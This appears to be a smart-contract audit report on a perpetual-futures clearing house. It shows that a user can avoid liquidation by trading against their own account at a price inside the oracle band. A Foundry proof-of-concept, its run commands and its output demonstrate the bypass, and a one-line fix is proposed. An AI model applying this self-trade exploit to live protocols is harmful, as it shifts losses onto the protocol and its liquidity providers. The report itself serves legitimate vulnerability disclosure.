Early Lipstick Cobra

high

# Users can avoid the possibility of liquidation

## Summary

When the margin utilization rate of the account is lower than `maintenanceMarginRatio`, the user's account will be liquidated. Therefore, in order to avoid liquidation, users must add margin to the account to make its account value higher than the `maintenance margin requirement`.

However, there is a vulnerability in the system, which can improve the utilization rate of account margin without adding more additional margin, which allows users to avoid the possibility of liquidation.

## Vulnerability Detail

There are two main reasons for this vulnerability:
1. The system does not restrict the account from trading with its own account.
2. The trade price can be different from the Oracle price As long as the price difference remains within a certain range, the transaction can be completed, `priceBandRatio` can be set in the `priceBandRatioMap` of the `config` contract.

The `priceBandRatio` will also be different according to the risk of different markets. Take the ETH market as an example, its `priceBandRatio` is about 5% (I consulted the project personnel on the discord discussion group).

Assuming that users open positions to hold long/short positions in ETH market. At this time, the user trades with himself, he can manipulate the trade price, thus manipulating the margin utilization rate of the account.

Let the code speak for itself, here's my test file: `MyTest.t.sol`, just put it in the `test/clearingHouse` directory:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

import "../oracleMaker/OracleMakerIntSetup.sol";
import { ClearingHouse } from "../../src/clearingHouse/ClearingHouse.sol";
import { IClearingHouse } from "../../src/clearingHouse/IClearingHouse.sol";
import { OracleMaker } from "../../src/maker/OracleMaker.sol";
import { LibError } from "../../src/common/LibError.sol";
import "forge-std/console.sol";


contract MyTest is OracleMakerIntSetup {
    bytes public makerData;
    address public taker = makeAddr("taker");
    address public lp = makeAddr("lp");
    struct MakerOrder {
        uint256 amount;
    }

    function setUp() public override {
        super.setUp();

        makerData = validPythUpdateDataItem;

        _mockPythPrice(150, 0);
        _deposit(marketId, taker, 500e6);
        maker.setValidSender(taker, true);

        deal(address(collateralToken), address(lp), 2000e6, true);
        vm.startPrank(lp);
        collateralToken.approve(address(maker), 2000e6);
        maker.deposit(2000e6);
        vm.stopPrank();
    }

    function test_imporveMarginRatio() public{
        vm.startPrank(taker);
        _mockPythPrice(150, 0);
        uint price = 150 * 1e18;
        // taker long ether with 1500 usd
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: makerData
            })
        );
        console.log("---------------- before ------------------- ");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));

        // taker trade with himself
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(taker), //NOTE maker equel taker
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: abi.encode(MakerOrder({
                    amount: 10.5 ether //NOTE suppose 5% band
                }))
            })
        );
        console.log("\r");
        console.log("---------------- after ------------------- ");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));

    }

    function test_avoidLiquidation() public{
        vm.startPrank(taker);
        _mockPythPrice(150, 0);
        // taker long ether with 1500 usd
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: makerData
            })
        );

        uint price = 109 * 1e18; //The price that make users to be liquidated
        console.log("---------------- normal ------------------- ");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));
        console.log("isLiquidatable", clearingHouse.isLiquidatable(marketId, taker, price));

        // taker trade with himself
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(taker), //NOTE maker equel taker
                isBaseToQuote: false,
                isExactInput: true,
                amount: 1500 ether,
                oppositeAmountBound: 10 ether,
                deadline: block.timestamp,
                makerData: abi.encode(MakerOrder({
                    amount: 10.5 ether //NOTE suppose 5% band
                }))
            })
        );
        console.log("\r");
        console.log("---------------- after taker trade with himself -------------------");
        printLegacyMarginProfile(_getMarginProfile(marketId, taker, price));
        console.log("isLiquidatable", clearingHouse.isLiquidatable(marketId, taker, price));
        vm.stopPrank();
    }

    function printLegacyMarginProfile(LegacyMarginProfile memory _legacy) private view {
        console.log("\r");
        console.log("accountValue:");
        console.logInt(_legacy.accountValue);
        console.log("\r");

        console.log("marginRatio:");
        console.logInt(_legacy.marginRatio);
        console.log("\r");
    }
}
```

First, run the `test_imporveMarginRatio` function to verify whether the margin utilization rate can be improved, run:

```shell
forge test --match-path test/clearingHouse/MyTest.t.sol --match-test test_imporveMarginRatio -vvv
```
Get the results:

```shell
Ran 1 test for test/clearingHouse/MyTest.t.sol:MyTest
[PASS] test_imporveMarginRatio() (gas: 1434850)
Logs:
  ---------------- before ------------------- 
  
  accountValue:
  500000000000000000000
  
  marginRatio:
  333333333333333333
  
  
  ---------------- after ------------------- 
  
  accountValue:
  500000000000000000000
  
  marginRatio:
  349999999999999999
  

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.51ms (4.20ms CPU time)
```

We can see that with the `accountValue` unchanged, the margin utilization rate has increased from `333333333333333333` to `349999999999999999`. Please note that this is only when `priceBandRatio` is equal to 5%, the greater the value of `priceBandRatio`, the greater the margin ratio that can be increased!

Then let's continue running the `test_avoidLiquidation` function, run:

```shell
forge test --match-path test/clearingHouse/MyTest.t.sol --match-test test_avoidLiquidation -vvv
```

Get the results:

```shell
Ran 1 test for test/clearingHouse/MyTest.t.sol:MyTest
[PASS] test_avoidLiquidation() (gas: 1528984)
Logs:
  ---------------- normal ------------------- 
  
  accountValue:
  90000000000000000000
  
  marginRatio:
  60000000000000000
  
  isLiquidatable true
  
  ---------------- after taker trade with himself -------------------
  
  accountValue:
  90000000000000000000
  
  marginRatio:
  62999999999999999
  
  isLiquidatable false

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.90ms (4.57ms CPU time)
```

Through the test results, it is found that the account should have met the conditions for liquidation, and by constructing its own transactions with itself, it can not be liquidated any more.

## Impact

By trading with themselves, users can improve their margin utilization without adding additional margin, which allows users to avoid the possibility of liquidation

## Code Snippet

Although the code snippet that caused the vulnerability is complex, the main reason is in the `_openPosition` function of the `ClearingHouse` contract:

https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L267-L356

## Tool used

Manual Review
Foundry Vscode

## Recommendation

Forcibly restrict users from trading with their own accounts.
Add judgment conditions to the `_openPosition` function of the `ClearingHouse` contract:

```solidity
require( taker != params.maker, "Taker can not equal to Maker" );
```

